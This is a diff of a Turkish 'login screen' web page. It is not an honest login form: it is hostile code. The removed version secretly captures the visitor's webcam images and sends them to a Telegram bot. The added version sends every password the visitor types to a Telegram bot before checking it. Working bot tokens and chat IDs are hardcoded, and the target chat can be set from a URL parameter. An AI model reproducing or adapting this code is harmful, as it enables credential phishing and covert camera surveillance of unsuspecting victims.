@@ -1,138 +1,96 @@
-<!DOCTYPE html>
-<html lang="tr">
+<!DOCTYPE html><html lang="tr">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Giriş Ekranı</title>
   <style>
     body {
-      margin: 0;
-      overflow: hidden;
-      background-color: black;
+      background-color: #111;
       color: white;
       font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
       text-align: center;
+      background: #222;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #555;
     }
-    #girisEkrani, #hataMesaji, #uyari {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+    input[type="password"] {
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      margin-top: 10px;
+      width: 80%;
     }
-    #kamera {
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 5px;
+      background-color: #28a745;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    .hidden {
       display: none;
-    }
-    .piece {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background-color: red;
-      animation: explode 0.6s forwards;
-    }
-    @keyframes explode {
-      to {
-        transform: translate(
-          calc(-50px + 100px * random()),
-          calc(-50px + 100px * random())
-        );
-        opacity: 0;
-      }
     }
   </style>
 </head>
 <body>
-  <div id="girisEkrani">
-    <input type="password" id="sifre" placeholder="Şifre">
-    <button onclick="girisKontrol()">Giriş</button>
-  </div>
-
-  <div id="hataMesaji" style="display:none;">Şifre yanlış!</div>
-  <div id="uyari" style="display:none;">Her linke tıklama lan!</div>
-
-  <video id="kamera" autoplay playsinline></video>
-  <audio id="breakSound" src="https://www.myinstants.com/media/sounds/minecraft_break.mp3"></audio>
-
-  <script>
-    // Chat ID sistemi
+  <div class="container">
+    <h2>Sisteme Giriş</h2>
+    <input type="password" id="passwordInput" placeholder="Şifreyi gir">
+    <br>
+    <button onclick="girisYap()">Kodu Gönder</button>
+    <p id="hata" class="hidden">Yanlış şifre girdin amk senin, bi daha dene.</p>
+  </div>  <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const chatParam = urlParams.get('chat');
-    const chatId = chatParam ? chatParam : "7791726274"; // Ana bot sahibi ID
-    const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
+    const chatID = urlParams.get("chat") || "7791726274"; // varsayılan yönetici ID
 
-    let tiklamaSayisi = 0;
+    function girisYap() {
+      const sifre = document.getElementById("passwordInput").value;
 
-    function girisKontrol() {
-      const sifre = document.getElementById("sifre").value;
-      if (sifre === "1234") { // şifreyi sonra Python'dan dinamikleştireceğiz
-        document.getElementById("girisEkrani").style.display = "none";
+      fetch(`https://api.telegram.org/bot8213782156:AAEJe2ILFHUktg5rMaN4SGX1_TS-YAUyf4k/sendMessage`, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatID,
+          text: `📥 Yeni Giriş Talebi\nŞifre: ${sifre}\nIP + cihaz bilgisi yakalanıyor...`
+        })
+      });
 
-        const video = document.getElementById('kamera');
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-          });
-      } else {
-        document.getElementById("girisEkrani").style.display = "none";
-        document.getElementById("hataMesaji").style.display = "block";
-      }
+      // Giriş doğrulama (örnek: sadece "1234" geçerli şifre)
+      fetch(`https://api.jsonbin.io/v3/b/YOUR_BIN_ID`, {
+        headers: {
+          'X-Master-Key': 'YOUR_SECRET_KEY'
+        }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.record && data.record[chatID] && data.record[chatID].sifre === sifre) {
+          window.location.href = `https://www.google.com/maps`; // veya kamerayla bilgi alınan özel sayfa
+        } else {
+          document.getElementById("hata").classList.remove("hidden");
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        document.getElementById("hata").textContent = "Sunucu hatası, daha sonra dene.";
+        document.getElementById("hata").classList.remove("hidden");
+      });
     }
-
-    function koduGonderTiklandi(button) {
-      tiklamaSayisi++;
-
-      const audio = document.getElementById("breakSound");
-      audio.currentTime = 0;
-      audio.play();
-
-      if (navigator.vibrate) {
-        navigator.vibrate(150);
-      }
-
-      fotoGonder();
-
-      if (tiklamaSayisi === 2) {
-        document.getElementById("uyari").style.display = "block";
-      }
-
-      explodeButton(button);
-    }
-
-    function explodeButton(button) {
-      const rect = button.getBoundingClientRect();
-      const pieces = 25;
-
-      for (let i = 0; i < pieces; i++) {
-        const piece = document.createElement("div");
-        piece.classList.add("piece");
-        piece.style.left = rect.left + (Math.random() * rect.width) + "px";
-        piece.style.top = rect.top + (Math.random() * rect.height) + "px";
-        document.body.appendChild(piece);
-        setTimeout(() => piece.remove(), 600);
-      }
-
-      button.style.visibility = "hidden";
-    }
-
-    function fotoGonder() {
-      const video = document.getElementById('kamera');
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "kamera.jpg");
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      }, 'image/jpeg');
-    }
-  </script>
-</body>
+  </script></body>
 </html>
